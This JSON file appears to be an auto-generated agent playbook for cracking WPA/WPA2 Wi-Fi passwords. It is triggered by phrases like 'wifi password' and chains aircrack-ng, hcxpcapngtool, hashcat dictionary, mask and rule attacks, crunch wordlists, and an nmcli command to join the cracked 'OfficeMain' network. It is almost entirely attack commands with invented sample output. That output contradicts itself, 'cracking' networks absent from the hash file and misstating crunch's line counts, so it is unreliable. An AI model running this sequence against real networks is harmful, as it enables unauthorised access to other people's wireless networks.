{
  "name": "wpa_wpa2_cracking",
  "description": "WPA/WPA2 password cracking using captured handshakes with aircrack-ng and hashcat",
  "pattern": "wpa.*crack|wpa2.*crack|aircrack|handshake.*crack|wifi.*password",
  "parameters": ["capture_file", "wordlist", "bssid"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aircrack-ng", "args": ["-w", "/usr/share/wordlists/rockyou.txt", "capture-01.cap"]},
      "expected_output": {"type": "string", "example": "Opening capture-01.cap\nRead 24873 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  DD:EE:FF:00:11:22  OfficeMain                WPA (1 handshake)\n   2  AA:BB:CC:DD:EE:FF  CorporateWiFi             WPA (0 handshake)\n\nIndex number of target network ? 1\n\nAircrack-ng 1.7\n\n      [00:00:47] 345872/14344391 keys tested (7342.15 k/s) \n\n      Time left: 31 minutes, 52 seconds                          2.41%\n\n                          KEY FOUND! [ office2024! ]\n\n\n      Master Key     : 3F 8B 2A 1C 4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C \n                       6D 7E 8F 9A 0B 1C 2D 3E 4F 5A 6B 7C 8D 9E 0F 1A\n\n      Transient Key  : 2B 3C 4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D 7E \n                       8F 9A 0B 1C 2D 3E 4F 5A 6B 7C 8D 9E 0F 1A 2B 3C \n                       4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D 7E 8F 9A \n                       0B 1C 2D 3E 4F 5A 6B 7C 8D 9E 0F 1A 2B 3C 4D 5E\n\n      EAPOL HMAC     : 9A 8B 7C 6D 5E 4F 3A 2B 1C 0D 9E 8F 7A 6B 5C 4D\n\nWPA2 password cracked!\n  SSID: OfficeMain\n  BSSID: DD:EE:FF:00:11:22\n  Password: office2024!\n  Time: 47 seconds\n  Keys tested: 345,872\n  Speed: 7,342 keys/second\n  Wordlist: rockyou.txt\n  \nHandshake was valid and complete\nPassword found in common wordlist\n  \nConnect to network:\n  nmcli dev wifi connect OfficeMain password office2024!"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "aircrack-ng", "args": ["-w", "/usr/share/wordlists/rockyou.txt", "-b", "AA:BB:CC:DD:EE:FF", "-l", "cracked_password.txt", "capture-01.cap"]},
      "expected_output": {"type": "string", "example": "Opening capture-01.cap\nRead 24873 packets.\n\nAircrack-ng 1.7\n\n      [00:03:24] 1847293/14344391 keys tested (9047.82 k/s) \n\n      Time left: 22 minutes, 58 seconds                         12.87%\n\n                          KEY FOUND! [ Corp@Wifi2023 ]\n\n\n      Master Key     : 1A 2B 3C 4D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D\n                       7E 8F 9A 0B 1C 2D 3E 4F 5A 6B 7C 8D 9E 0F 1A 2B\n\n      Transient Key  : [... truncated ...]\n\n      EAPOL HMAC     : 5D 6E 7F 8A 9B 0C 1D 2E 3F 4A 5B 6C 7D 8E 9F 0A\n\nPassword saved to cracked_password.txt\n\nTargeted crack with BSSID filter:\n  Target: AA:BB:CC:DD:EE:FF (CorporateWiFi)\n  Password: Corp@Wifi2023\n  Time: 3 minutes 24 seconds\n  Keys tested: 1,847,293\n  Output: cracked_password.txt\n  \nCracked password file:\n  cat cracked_password.txt\n  Corp@Wifi2023"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hcxpcapngtool", "args": ["-o", "hashes.hc22000", "capture-01.cap"]},
      "expected_output": {"type": "string", "example": "hcxpcapngtool 6.2.7 reading from capture-01.cap...\n\nsummary capture file\n--------------------\nfile name........................: capture-01.cap\nfile type........................: pcapng 1.0\nfile hardware information........: x86_64\nfile os information..............: Linux 5.15.0\nfile application information.....: Dumpcap (Wireshark) 3.6.2\nnetwork type.....................: DLT_IEEE802_11_RADIO (127)\nendianness.......................: little endian\nread errors......................: flawless\npackets inside...................: 24873\nskipped packets..................: 0\npackets with FCS.................: 24873\nbeacons (total)..................: 1247\nbeacons (WPS info)...............: 4\nprobes (total)...................: 156\nassociations.....................: 12\nreassociations...................: 3\nauthentications..................: 8\nEAPOL packets (total)............: 8\nEAPOL packets (WPA2).............: 8\nvalid handshakes.................: 2\n\nnetworks detected:\n  BSSID: DD:EE:FF:00:11:22 ESSID: OfficeMain\n  BSSID: AA:BB:CC:DD:EE:FF ESSID: CorporateWiFi\n\nconversion summary\n------------------\nwritten hc22000 records..........: 2\n\nhashes.hc22000 created for hashcat:\n  Format: hc22000 (WPA-PBKDF2-PMKID+EAPOL)\n  Records: 2 handshakes\n  Compatible: hashcat -m 22000\n  \nHashcat is much faster than aircrack-ng:\n  - GPU acceleration\n  - Advanced rule-based attacks\n  - Mask attacks for patterns\n  - Hybrid attacks"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hashcat", "args": ["-m", "22000", "hashes.hc22000", "/usr/share/wordlists/rockyou.txt"]},
      "expected_output": {"type": "string", "example": "hashcat (v6.2.6) starting...\n\nOpenCL API (OpenCL 3.0 CUDA 12.0.76) - Platform #1 [NVIDIA Corporation]\n====================================================================\n* Device #1: NVIDIA GeForce RTX 3080, 9856/10240 MB (2560 MB allocatable), 68MCU\n\nMinimum password length supported by kernel: 8\nMaximum password length supported by kernel: 63\n\nHashes: 2 digests; 2 unique digests, 2 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\n\nApplicable optimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n* Slow-Hash-SIMD-LOOP\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 536 MB\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344391\n* Bytes.....: 139921497\n* Keyspace..: 14344384\n* Runtime...: 2 secs\n\nDD:EE:FF:00:11:22:AB:CD:EF:12:34:56:OfficeMain:office2024!\nAA:BB:CC:DD:EE:FF:12:34:56:78:90:AB:CorporateWiFi:Corp@Wifi2023\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)\nHash.Target......: hashes.hc22000\nTime.Started.....: Mon Jan 15 14:40:00 2024 (1 min, 23 secs)\nTime.Estimated...: Mon Jan 15 14:41:23 2024 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   341.2 kH/s (87.45ms) @ Accel:32 Loops:128 Thr:256 Vec:1\nRecovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new)\nProgress.........: 28450816/28688768 (99.17%)\nRejected.........: 0/28450816 (0.00%)\nRestore.Point....: 14223360/14344384 (99.16%)\nRestore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: $HEX[21217365636b79] -> $HEX[042a0337c2a156616d6f732103]\nHardware.Mon.#1..: Temp: 68c Fan: 45% Util: 99% Core:1875MHz Mem:9501MHz Bus:16\n\nStarted: Mon Jan 15 14:40:00 2024\nStopped: Mon Jan 15 14:41:25 2024\n\nHashcat GPU cracking:\n  Mode: 22000 (WPA-PBKDF2-PMKID+EAPOL)\n  GPU: NVIDIA RTX 3080\n  Speed: 341,200 hashes/second (341.2 kH/s)\n  Time: 1 minute 23 seconds\n  Results: Both passwords cracked\n    - OfficeMain: office2024!\n    - CorporateWiFi: Corp@Wifi2023\n  \nHashcat vs Aircrack comparison:\n  Aircrack-ng: ~7,000-10,000 H/s (CPU)\n  Hashcat RTX 3080: ~340,000 H/s (GPU)\n  Speedup: ~34x faster with GPU"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hashcat", "args": ["-m", "22000", "hashes.hc22000", "-a", "3", "?u?l?l?l?l?l?d?d?d?d"]},
      "expected_output": {"type": "string", "example": "hashcat (v6.2.6) starting...\n\nOpenCL API (OpenCL 3.0 CUDA 12.0.76) - Platform #1 [NVIDIA Corporation]\n\nHashes: 2 digests; 2 unique digests, 2 unique salts\n\nMask attack mode:\n  Mask: ?u?l?l?l?l?l?d?d?d?d\n  Pattern: Capital letter + 5 lowercase + 4 digits\n  Example: Office2024, Secret1234, Winter2023\n  \n  Mask breakdown:\n    ?u = uppercase (A-Z): 26 possibilities\n    ?l = lowercase (a-z): 26 possibilities (x5)\n    ?d = digit (0-9): 10 possibilities (x4)\n  \n  Total keyspace: 26 * 26^5 * 10^4 = 1,188,137,600,000\n  Estimated time: ~57 minutes at 341 kH/s\n\nSession..........: hashcat\nStatus...........: Running\nHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)\nHash.Target......: hashes.hc22000\nTime.Started.....: Mon Jan 15 14:45:00 2024\nTime.Estimated...: Mon Jan 15 15:42:00 2024 (57 mins)\nGuess.Mask.......: ?u?l?l?l?l?l?d?d?d?d [10]\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   341.7 kH/s (87.32ms)\nProgress.........: 1231523840/1188137600000 (0.10%)\n\n[... 23 minutes later ...]\n\nFF:11:22:33:44:55:66:77:88:99:AA:BB:GuestWiFi:Guest2023\n\nStatus...........: Cracked\nRecovered........: 1/2 (50.00%) Digests\nProgress.........: 472839168000/1188137600000 (39.79%)\nTime.Started.....: Mon Jan 15 14:45:00 2024 (23 mins, 14 secs)\nTime.Estimated...: Mon Jan 15 15:08:14 2024 (0 secs)\n\nMask attack successful!\n  Pattern matched: Guest2023\n  Matches mask: ?u?l?l?l?l?d?d?d?d (Guest + 2023)\n  Time: 23 minutes\n  Progress: 40% of keyspace\n  \nMask attacks work when password follows pattern:\n  - Company name + year\n  - Word + numbers\n  - Capital + lowercase + digits\n  \nCommon WiFi password masks:\n  ?u?l?l?l?l?l?d?d?d?d     (Office2024)\n  ?l?l?l?l?l?l?d?d         (summer24)\n  ?u?l?l?l?l?l?l?l?d?d?d?d (Password2023)\n  ?d?d?d?d?d?d?d?d         (12345678 - very weak)"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hashcat", "args": ["-m", "22000", "hashes.hc22000", "/usr/share/wordlists/rockyou.txt", "-r", "/usr/share/hashcat/rules/best64.rule"]},
      "expected_output": {"type": "string", "example": "hashcat (v6.2.6) starting...\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344391\n* Bytes.....: 139921497\n* Keyspace..: 1028024896 (14344391 * 64 rules)\n\nRules applied: best64.rule\n  Common transformations:\n    - password → password1, password123\n    - password → Password, PASSWORD, pAssword\n    - password → p@ssword, pa$$word\n    - password → password!, password#\n    - password → drowssap (reverse)\n  \n  Rule examples from best64:\n    :          (do nothing)\n    l          (lowercase all)\n    u          (uppercase all)\n    c          (capitalize first)\n    $1 $2 $3   (append 123)\n    ^1 ^2 ^3   (prepend 123)\n    r          (reverse)\n    d          (duplicate - passpass)\n\nBB:CC:DD:EE:FF:00:11:22:33:44:55:HomeNetwork:welcome1\n\nStatus...........: Cracked\nRecovered........: 1/2 (50.00%) Digests\nProgress.........: 847362048/1028024896 (82.42%)\nSpeed.#1.........:   348.5 kH/s\nTime.Started.....: Mon Jan 15 14:50:00 2024 (40 mins, 32 secs)\n\nRule-based attack success!\n  Base word: welcome (from rockyou.txt)\n  Rule applied: $1 (append '1')\n  Result password: welcome1\n  \nOriginal word 'welcome' was in wordlist\nBut exact password 'welcome1' was NOT in wordlist\nRule transformation found the variation\n  \nRule-based attacks catch:\n  - password → password123, password!\n  - admin → Admin, admin2024, @dmin\n  - wifi → WiFi, wifi2023, w1f1\n  \nVastly increases dictionary effectiveness"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "crunch", "args": ["8", "8", "-t", "@@@@2024", "-o", "custom_wordlist.txt"]},
      "expected_output": {"type": "string", "example": "Crunch will now generate the following amount of data: 4776960000 bytes\n4554 MB\n4 GB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 456976000\n\ncrunch: 100% completed generating output\n\nCustom wordlist generated:\n  Pattern: @@@@2024\n  @ = lowercase letter\n  Length: 8 characters\n  Format: 4 letters + \"2024\"\n  \nExamples generated:\n  aaaa2024\n  aaab2024\n  ...\n  test2024\n  wifi2024\n  corp2024\n  ...\n  zzzz2024\n  \nTotal passwords: 456,976,000\nFile size: 4.5 GB\n  \nUse with hashcat:\n  hashcat -m 22000 hashes.hc22000 custom_wordlist.txt\n  \nCrunch patterns:\n  @@@@2024  (corp2024, test2024)\n  @@@@@@@@  (all lowercase 8-char)\n  @@@,@@@   (lowercase with comma: abc,def)\n  %%%%%%%%%% (all digits: 0000000000-9999999999)"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
